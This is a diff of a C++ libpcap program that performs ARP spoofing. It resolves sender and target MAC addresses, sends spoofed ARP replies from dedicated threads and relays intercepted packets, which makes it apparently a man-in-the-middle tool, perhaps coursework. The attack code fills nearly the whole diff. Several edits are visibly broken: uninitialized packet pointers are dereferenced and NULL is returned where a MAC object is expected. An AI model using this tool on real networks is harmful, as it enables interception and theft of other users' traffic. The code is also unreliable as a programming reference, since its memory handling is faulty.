@@ -189,29 +189,7 @@ char * get_my_ip_address(char * interface){
     return Ip;
 }
 
-int get_mac_addr(const u_char * packet,Mac my_mac, Mac * mac){
-    EthernetHeader* etherHeader = (EthernetHeader*)packet;
-    EthArpPacket * etherArpPacket;
 
-    etherArpPacket->eth_.dmac_ = etherHeader->dstMac;
-    etherArpPacket->eth_.smac_ = etherHeader->srcMac;
-    etherArpPacket->eth_.type_ = etherHeader->type;
-
-
-    if (etherArpPacket->eth_.dmac() == std::string("FF:FF:FF:FF:FF:FF")){
-        return 0;
-    }
-
-    if ((etherArpPacket->eth_.type() == ARP || etherArpPacket->eth_.dmac() == my_mac)){
-        *mac = etherHeader->srcMac;
-        return 1;
-    }else{
-
-        return 0;
-    }
-
-
-}
 
 int send_request(char * dev, Mac my_mac, char * sender_ip, char * my_ip){
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -241,15 +219,16 @@ int send_request(char * dev, Mac my_mac, char * sender_ip, char * my_ip){
     pcap_close(handle);
 }
 
-int get_arp_packet(char * dev, Mac * sender_mac,Mac my_mac,char * sender_ip, char * my_ip){
+Mac get_arp_packet(char * dev,Mac my_mac,char * sender_ip, char * my_ip){
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
-
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return 0;
     }
+    
     send_request(dev,my_mac,sender_ip,my_ip);
+    
     struct pcap_pkthdr* header;
     const u_char* packet;
     while(true){
@@ -259,13 +238,30 @@ int get_arp_packet(char * dev, Mac * sender_mac,Mac my_mac,char * sender_ip, cha
 
             exit(1);
         }
-        if (get_mac_addr(packet, my_mac,sender_mac)== 1){
+        int * type;
+        EthernetHeader* etherHeader = (EthernetHeader*)packet;
+    	EthArpPacket * etherArpPacket;
 
-            break;
-        }
+    	etherArpPacket->eth_.type_ = etherHeader->type;
+ 	etherArpPacket->eth_.smac_ = etherHeader->srcMac;
+ 	etherArpPacket->eth_.dmac_ = etherHeader->dstMac;
+
+    	if ( etherArpPacket->eth_.dmac() == std::string("FF:FF:FF:FF:FF:FF")){
+
+    	    continue;
+    	}
+
+    	if ((etherArpPacket->eth_.type() == ARP || etherArpPacket->eth_.dmac() == my_mac)){
+    	    return etherArpPacket->eth_.smac_;
+    	}else{
+
+    	    continue;
+    	}
+        
+        
     }
     pcap_close(handle);
-    return 1;
+    return NULL;
 }
 
 int get_sender_arp_packet(char * dev,Mac target_mac, Mac sender_mac,Mac my_mac){
@@ -298,18 +294,20 @@ int get_sender_arp_packet(char * dev,Mac target_mac, Mac sender_mac,Mac my_mac){
 
     ethHdr->dmac_ = etherHeader->dstMac;
     ethHdr->smac_ = etherHeader->srcMac;
-    
-    if (ethHdr->dmac() == Mac("ff:ff:ff:ff:ff:ff") && ethHdr->smac() == sender_mac){
+    std::cout << std::string(ethHdr->smac()) << std::endl;
+    std::cout << std::string(ethHdr->dmac()) << std::endl;
+    std::cout << std::endl;    
+    if (ethHdr->dmac().isBroadcast() == true){
 	std::cout << std::string(ethHdr->dmac()) << std::endl;    	
     }
 
 
-    if (ethHdr->dmac().isBroadcast() == true && ethHdr->smac() == sender_mac){
+    if (ethHdr->dmac().isBroadcast() == true){
         pcap_close(handle);
         std::cout << "spoofing_broad" << std::endl;
         std::cout << std::endl;
 	std::cout << std::endl;
-        return 1;
+        return 2;
     }
     if (ethHdr->dmac() == my_mac && ethHdr->smac() == sender_mac){
         pcap_close(handle);
@@ -327,16 +325,25 @@ int get_sender_arp_packet(char * dev,Mac target_mac, Mac sender_mac,Mac my_mac){
         return 1;
     }
 
+    if (ethHdr->dmac() == sender_mac && ethHdr->smac() == target_mac){
+        pcap_close(handle);
+        std::cout << "spoofing_unicast" << std::endl;
+        std::cout << std::endl;
+	std::cout << std::endl;
+        return 1;
+    }
+    
+
 
     pcap_close(handle);
     return 0;
 }
 
 Mac get_mac_address(char * dev, Mac my_mac, char * sender_ip, char * my_ip){
-    Mac * sender_mac;
+    Mac sender_mac;
 
-    get_arp_packet(dev,sender_mac, my_mac,sender_ip, my_ip);
-    return *sender_mac;
+    sender_mac = get_arp_packet(dev, my_mac,sender_ip, my_ip);
+    return sender_mac;
 }
 
 void *sender_arp_spoofing(void *senderInfo){
@@ -412,6 +419,7 @@ void *target_arp_spoofing(void *targetInfo){
     }
 
     while(true){
+    
         if (get_sender_arp_packet(target->dev_,target->sender_mac_, target->target_mac_, target->my_mac_) == 1){
 
             int res = pcap_sendpacket(s_handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
@@ -637,7 +645,6 @@ void *relay_sender_data(void * info){
             continue;
         }
 
-        //const u_char * new_packet = sniff_packet(packet);
 
         u_char * new_packet = sniff_packet(packet,senderInfo->my_mac_, senderInfo->target_mac_ );
         if(pcap_sendpacket(pcap, new_packet, header->caplen /* size */) != 0)
@@ -708,21 +715,30 @@ std::vector<Info> listing_info(int argc,char * argv[],Mac my_mac,char * my_ip){
 
     std::vector<Info> info;
     Info mac_ip;
-
+    std::cout << argv[1] <<std::endl;
     for(int i=2; i < argc; i++){
-        if(i%2 == 0){
-            mac_ip.sender_mac_ = get_mac_address(argv[1],my_mac,argv[i], my_ip);
-            mac_ip.sender_ip_ = argv[i];
-            ++i;
-
-        }
+        
+        mac_ip.sender_mac_ = get_mac_address(argv[1],my_mac,argv[i], my_ip);
+        mac_ip.sender_ip_ = argv[i];
+        ++i;
+        
         mac_ip.target_mac_ = get_mac_address(argv[1],my_mac,argv[i], my_ip);
+
         mac_ip.target_ip_ = argv[i];
         mac_ip.dev_ = argv[1];
         mac_ip.my_mac_ = my_mac;
         mac_ip.my_ip_ = my_ip;
         info.push_back(mac_ip);
+
     }
+
+    std::cout << "My Mac     :" <<std::string(info[0].my_mac_) << std::endl;
+    std::cout << "Sender IP  :" <<std::string(info[0].sender_ip_) << std::endl;    
+    std::cout << "Interface  :" <<std::string(info[0].dev_) << std::endl;
+    std::cout << "Sender MAC :" <<std::string(info[0].sender_mac_) << std::endl;
+    std::cout << "Sender IP  :" <<std::string(info[0].sender_ip_) << std::endl;
+    std::cout << "Target MAC :" <<std::string(info[0].target_mac_) << std::endl;
+    std::cout << "Target IP  :" <<std::string(info[0].target_ip_) << std::endl;  
 
     return info;
 }
@@ -776,5 +792,4 @@ int main(int argc, char* argv[]){
 
 
 }
-
 
